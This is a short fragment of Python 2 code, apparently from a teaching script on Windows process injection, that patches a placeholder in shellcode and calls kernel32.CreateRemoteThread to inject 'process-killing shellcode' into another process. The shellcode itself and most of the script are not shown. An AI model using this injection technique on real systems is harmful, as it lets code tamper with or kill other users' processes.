...
repalce_string='\x41'*4
shellcode=shellcode.replace(repalce_string,replace_value)
...
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
	print '[*] Failed to inject process-killing shellcode.Exting.'
	sys.exit(0)
